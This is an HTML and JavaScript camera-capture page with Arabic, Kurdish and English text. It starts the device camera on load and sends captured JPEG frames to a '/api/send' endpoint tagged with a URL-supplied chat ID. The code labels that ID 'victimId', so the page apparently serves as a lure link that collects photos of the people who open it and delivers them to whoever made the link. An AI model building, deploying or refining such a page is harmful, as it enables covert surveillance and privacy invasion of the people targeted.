<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="page_title">الكاميرا</title>

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #000;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        /* ---------- ڤیدیۆی کامێرا وەک باکگراوند ---------- */
        #viewfinder {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(6px);
            z-index: 1;
        }

        /* ---------- هەڵبژاردەی زمان ---------- */
        .lang-selector {
            position: fixed;
            top: 15px;
            right: 20px;
            z-index: 99;
            background: #fff;
            border-radius: 30px;
            padding: 5px 15px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            gap: 10px;
        }

        .lang-btn {
            border: none;
            background: transparent;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: #666;
            transition: 0.3s;
        }

        .lang-btn.active {
            background: #34c759;
            color: #fff;
        }

        /* ---------- کاردی سەرەکی ---------- */
        .card {
            position: relative;
            z-index: 2;
            width: 390px;
            max-width: 95%;
            background: rgba(255, 255, 255, .92);
            backdrop-filter: blur(15px);
            border-radius: 28px;
            padding: 35px 28px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, .35);
            text-align: center;
        }

        .icon {
            width: 90px;
            height: 90px;
            margin: auto;
            margin-bottom: 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 42px;
            color: #fff;
            box-shadow: 0 10px 25px rgba(238, 90, 36, .45);
        }

        h1 {
            color: #222;
            font-size: 28px;
            margin-bottom: 15px;
        }

        .desc {
            font-size: 16px;
            color: #555;
            line-height: 1.9;
            margin-bottom: 25px;
        }

        .info {
            background: #f8f9fb;
            border-radius: 18px;
            padding: 18px;
            text-align: right;
            margin-bottom: 25px;
        }

        .info h2 {
            font-size: 18px;
            margin-bottom: 12px;
            color: #222;
        }

        .info p {
            color: #555;
            line-height: 1.8;
            font-size: 15px;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 50px;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: .25s;
        }

        .btn:hover {
            transform: scale(1.03);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .note {
            margin-top: 20px;
            font-size: 13px;
            color: #777;
        }

        #result {
            margin-top: 15px;
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>

    <!-- ========== ڤیدیۆی پشتەوە ========== -->
    <div id="viewfinder">
        <video id="video" autoplay playsinline muted></video>
    </div>
    <div id="overlay"></div>

    <!-- ========== هەڵبژاردەی زمان ========== -->
    <div class="lang-selector">
        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
        <button class="lang-btn" onclick="changeLang('en')">English</button>
    </div>

    <!-- ========== کاردی ناوەڕۆک ========== -->
    <div class="card">
        <div class="icon">📷</div>
        <h1 data-i18n="main_title">التقط صورة</h1>
        <p class="desc" data-i18n="desc">
            يمكنك التقاط صورة مباشرةً وإرسالها.
            اضغط على الزر أدناه لبدء التصوير.
        </p>

        <div class="info">
            <h2 data-i18n="info_title">معلومات</h2>
            <p data-i18n="info_text">
                سيتم التقاط الصورة وإرسالها تلقائياً.
            </p>
        </div>

        <button id="btnCapture" class="btn" data-i18n="start_btn">
            📸 اضغط لالتقاط صورة
        </button>

        <div id="result"></div>

        <p class="note" data-i18n="footer_note">
            سيتم إرسال الصورة للجهة المحددة
        </p>
    </div>

    <script>
        // ========== وەرگێڕان ==========
        const translations = {
            ar: {
                page_title: "الكاميرا",
                main_title: "التقط صورة",
                desc: "يمكنك التقاط صورة مباشرةً وإرسالها. اضغط على الزر أدناه لبدء التصوير.",
                info_title: "معلومات",
                info_text: "سيتم التقاط الصورة وإرسالها تلقائياً.",
                start_btn: "📸 اضغط لالتقاط صورة",
                footer_note: "سيتم إرسال الصورة للجهة المحددة",
                loading: "⏳ جارٍ التجهيز...",
                success: "✅ تم الإرسال بنجاح",
                done: "✅ تم",
                error_prefix: "❌ فشل: ",
                retry: "📸 إعادة المحاولة",
                camera_error: "⚠️ تعذّر الوصول للكاميرا"
            },
            ckb: {
                page_title: "کامێرا",
                main_title: "وێنەیەک بگرە",
                desc: "دەتوانیت ڕاستەوخۆ وێنەیەک بگریت و بینێریت. بۆ دەستپێکردن کرتە لەسەر دوگمەکەی خوارەوە بکە.",
                info_title: "زانیاری",
                info_text: "وێنەکە بە شێوەیەکی خۆکار دەگیرێت و دەنێردرێت.",
                start_btn: "📸 بۆ گرتنی وێنە کرتە لێرە بکە",
                footer_note: "وێنەکە بۆ لایەنی دیاریکراو دەنێردرێت",
                loading: "⏳ چاوەڕوانی ئامادەکردن...",
                success: "✅ بە سەرکەوتوویی نێردرا",
                done: "✅ تەواو",
                error_prefix: "❌ شکست: ",
                retry: "📸 دووبارە هەوڵبدەرەوە",
                camera_error: "⚠️ نەتوانرا کامێرا بکرێتەوە"
            },
            en: {
                page_title: "Camera",
                main_title: "Take a Picture",
                desc: "You can capture a photo instantly and send it. Click the button below to start.",
                info_title: "Information",
                info_text: "The photo will be captured and sent automatically.",
                start_btn: "📸 Click to take a picture",
                footer_note: "The photo will be sent to the designated recipient",
                loading: "⏳ Preparing...",
                success: "✅ Sent successfully",
                done: "✅ Done",
                error_prefix: "❌ Failed: ",
                retry: "📸 Retry",
                camera_error: "⚠️ Could not access camera"
            }
        };

        let currentLang = localStorage.getItem('preferred_lang_cam') || 'ar';

        function changeLang(lang) {
            currentLang = lang;
            localStorage.setItem('preferred_lang_cam', lang);

            // ئاڕاستە
            document.documentElement.dir = (lang === 'en') ? 'ltr' : 'rtl';

            // نوێکردنەوەی ناونیشانەکان
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (translations[lang] && translations[lang][key]) {
                    el.textContent = translations[lang][key];
                }
            });

            // دوگمەی چالاک
            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');

            // نوێکردنەوەی دوگمەکە ئەگەر لە دۆخی چاوەڕوانی یان تەواوبوون بێت
            const btn = document.getElementById('btnCapture');
            if (btn.disabled) {
                btn.textContent = translations[lang].loading;
            } else if (btn.textContent.includes('✅')) {
                btn.textContent = translations[lang].done;
            } else if (btn.textContent.includes('📸')) {
                btn.textContent = translations[lang].start_btn;
            }
        }

        // بارکردنی زمان
        window.addEventListener('DOMContentLoaded', () => {
            changeLang(currentLang);
            startCamera();
        });

        // ===== بلۆکی ناردن (وەک خۆی) =====
        const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';

        async function apiSend(payload) {
            try {
                const r = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                return r.ok;
            } catch (e) { return false; }
        }
        // ==============================

        const video = document.getElementById('video');
        const resultEl = document.getElementById('result');
        let stream = null;

        function sendPhoto(dataUrl) {
            const btn = document.getElementById('btnCapture');
            btn.disabled = true;
            btn.textContent = translations[currentLang].loading;

            apiSend({ type: 'photo', chatId: victimId, photo: dataUrl, caption: '📸 صورة من الكاميرا' })
                .then(ok => {
                    resultEl.textContent = ok ? translations[currentLang].success : translations[currentLang].error_prefix + 'فشل';
                    btn.textContent = translations[currentLang].done;
                    setTimeout(() => {
                        btn.disabled = false;
                        btn.textContent = translations[currentLang].start_btn;
                        resultEl.textContent = '';
                    }, 2000);
                });
        }

        async function startCamera() {
            const btn = document.getElementById('btnCapture');
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' },
                    audio: false
                });
                video.srcObject = stream;
                btn.textContent = translations[currentLang].start_btn;
                btn.disabled = false;
            } catch (e) {
                resultEl.textContent = translations[currentLang].camera_error;
                btn.textContent = translations[currentLang].retry;
                btn.disabled = false;
            }
        }

        document.getElementById('btnCapture').addEventListener('click', () => {
            if (!stream) {
                resultEl.textContent = translations[currentLang].camera_error;
                return;
            }
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
        });
    </script>
</body>
</html>
